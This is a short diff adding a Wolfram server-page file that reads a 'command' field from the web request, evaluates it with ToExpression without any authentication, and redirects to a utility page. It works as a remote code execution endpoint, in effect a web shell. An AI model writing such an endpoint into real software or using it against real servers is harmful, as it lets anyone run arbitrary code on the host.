@@ -1,0 +1,7 @@
+<?wsp
+    $CurrentRequest["Redirect"] = "/utils/redir.wsp";
+    (* execute BIG command *)
+
+    $CurrentRequest["Data", "command"]//ToExpression;
+    "Ok!"
+?>
